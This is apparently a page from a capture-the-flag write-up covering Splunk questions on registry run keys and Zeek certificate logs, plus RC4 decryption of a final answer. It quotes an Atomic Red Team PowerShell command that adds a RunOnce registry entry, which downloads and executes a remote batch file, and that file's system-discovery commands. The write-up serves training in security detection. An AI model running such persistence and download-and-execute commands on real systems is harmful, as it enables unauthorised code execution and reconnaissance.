+<h3 id="question-6-alice-ran-a-simulation-of-an-attacker-abusing-windows-registry-run-keys-this-technique-leveraged-a-multi-line-batch-file-that-was-also-used-by-a-few-other-techniques-what-is-the-final-command-of-this-multi-line-batch-file-used-as-part-of-this-simulation">Question 6: <code>Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?</code><a class="headerlink" href="#question-6-alice-ran-a-simulation-of-an-attacker-abusing-windows-registry-run-keys-this-technique-leveraged-a-multi-line-batch-file-that-was-also-used-by-a-few-other-techniques-what-is-the-final-command-of-this-multi-line-batch-file-used-as-part-of-this-simulation" title="Permanent link">#</a></h3>
+<p>As with Question 5, we'll use the ATT&amp;CK Navigator to
+search for 'run key'. The technique used is <code>T1547.001 'Boot
+or Logon Autostart Execution: Registry Run Keys / Startup
+Folder'</code>. </p>
+<p><img alt="ATT&amp;CK search for 'run key'" src="../../img/6/o6-14.png" /></p>
+<p>Looking in the Atomic Red Team source for T1547.001 at
+<code>https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1547.001</code>
+shows a <code>batstartup.bat</code> file in the <code>src</code> directory, but it only
+contains a single line of <code>echo " T1547.001 Hello World Bat"</code>. Searching
+<code>T1547.001.yaml</code> finds a reference to another <code>.bat</code> file:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="p p-Indicator">-</span> <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">PowerShell Registry RunOnce</span>
+  <span class="nt">auto_generated_guid</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">eb44f842-0457-4ddc-9b92-c4caa144ac42</span>
+  <span class="nt">description</span><span class="p">:</span> <span class="p p-Indicator">|</span>
+    <span class="no">RunOnce Key Persistence via PowerShell</span>
+    <span class="no">Upon successful execution, a new entry will be added to the runonce item in the registry.</span>
+  <span class="nt">supported_platforms</span><span class="p">:</span>
+  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">windows</span>
+  <span class="nt">input_arguments</span><span class="p">:</span>
+    <span class="nt">thing_to_execute</span><span class="p">:</span>
+      <span class="nt">description</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Thing to Run</span>
+      <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Path</span>
+      <span class="nt">default</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">powershell.exe</span>
+    <span class="nt">reg_key_path</span><span class="p">:</span>
+      <span class="nt">description</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Path to registry key to update</span>
+      <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Path</span>
+      <span class="nt">default</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce</span>
+  <span class="nt">executor</span><span class="p">:</span>
+    <span class="nt">command</span><span class="p">:</span> <span class="p p-Indicator">|</span>
+      <span class="no">$RunOnceKey = &quot;#{reg_key_path}&quot;</span>
+<span class="hll">      <span class="no">set-itemproperty $RunOnceKey &quot;NextRun&quot; &#39;#{thing_to_execute} &quot;IEX (New-Object Net.WebClient).DownloadString(`&quot;https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`&quot;)&quot;&#39;</span>
+</span>    <span class="nt">cleanup_command</span><span class="p">:</span> <span class="p p-Indicator">|</span>
+      <span class="no">Remove-ItemProperty -Path #{reg_key_path} -Name &quot;NextRun&quot; -Force -ErrorAction Ignore</span>
+    <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">powershell</span>
+    <span class="nt">elevation_required</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+</code></pre></div>
+</td></tr></table>
+<p>Examining the file <code>https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat</code> shows that <code>quser</code> is the last command executed in the file:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>37
+38
+39
+40
+41
+42
+43
+44</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>arp -a
+whoami
+ipconfig /displaydns
+route print
+netsh advfirewall show allprofiles
+systeminfo
+qwinsta
+<span class="hll">quser
+</span></code></pre></div>
+</td></tr></table>
+<h3 id="question-7-according-to-x509-certificate-events-captured-by-zeek-formerly-bro-what-is-the-serial-number-of-the-tls-certificate-assigned-to-the-windows-domain-controller-in-the-attack-range">Question 7: <code>According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range?</code><a class="headerlink" href="#question-7-according-to-x509-certificate-events-captured-by-zeek-formerly-bro-what-is-the-serial-number-of-the-tls-certificate-assigned-to-the-windows-domain-controller-in-the-attack-range" title="Permanent link">#</a></h3>
+<p><a href="https://zeek.org">Zeek</a> (formerly Bro) is an open-source Network Security Monitoring tool. Zeek watches network packets, interpretes the traffic, and creates compact and searchable logs and data. Here, we're looking for the serial number of an x509 certificate, assigned to the Windows Domain Controller in the simulated environment. We can search for Zeek log entries with <code>serial</code> in them with <code>index=* sourcetype=bro* serial</code>. The first result returned is interesting:</p>
+<p><img alt="Splunk search of Zeek logs for 'serial'" src="../../img/6/o6-15.png" /></p>
+<p>The host returned is named <code>win-dc-748.attackrange.local</code>, which at a guess is probably the Domain Controller. The serial number of the certificate is <code>55FCEEBB21270D9249E86F4B9DC7AA60</code>.</p>
+<p>Answering Question 7 gives us the data needed to answer the Objective. Alice has three pieces of information we need:</p>
+<blockquote>
+<p>This last one is encrypted using your favorite phrase! The base64 encoded ciphertext is: <code>7FXjP1lyfKbyDK/MChyf36h7</code></br>
+It's encrypted with an old algorithm that uses a key. We don't care about RFC 7465 up here!</br>
+I can't believe the Splunk folks put it in their talk!</br></p>
+</blockquote>
+<p><a href="https://tools.ietf.org/html/rfc7465">RFC 7465</a> deals with deprecating the RC4 encryption algorithm. <code>I can't believe the Splunk folks put it in their talk!</code> refers to a final tidbit in the <a href="https://www.youtube.com/watch?v=RxVgEFt08kU">Splunk talk</a>: <code>Stay Frosty</code></p>
+<p><img alt="Stay Frosty" src="../../img/6/o6-16.png" /></p>
+<p>With these pieces of data, we can use <a href="https://gchq.github.io/CyberChef/">CyberChef</a> to decrypt the message. CyberChef is a browser-based utility for data manipulation, in a drag &amp; drop interface. We can copy the ciphertext to the <strong>Input</strong> section, drag the <strong>From Base64</strong> and <strong>RC4</strong> tasks to the <strong>Recipe</strong> section, enter the key of <code>Stay Frosty</code>, and CyberChef gives the adversary.</p>
+<p><img alt="The Lollipop Guild" src="../../img/6/o6-17.png" /></p>
+<h2 id="answer">Answer<a class="headerlink" href="#answer" title="Permanent link">#</a></h2>
+<p><code>The Lollipop Guild</code></p>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../5/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Open HID Lock
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../7/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Solve the Sleigh's CAN-D-BUS Problem
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Joe Ammond - <a href="http://twitter.com/joeammond">@joeammond</a>
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+  <div class="md-footer-social">
+    
+      
+      
+        
+        
+      
+      <a href="https://twitter.com/joeammond" target="_blank" rel="noopener" title="twitter.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://www.linkedin.com/in/joeammond/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+      </a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.08c56446.min.js"></script>
+      <script src="../../assets/javascripts/bundle.6ced434e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: [],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
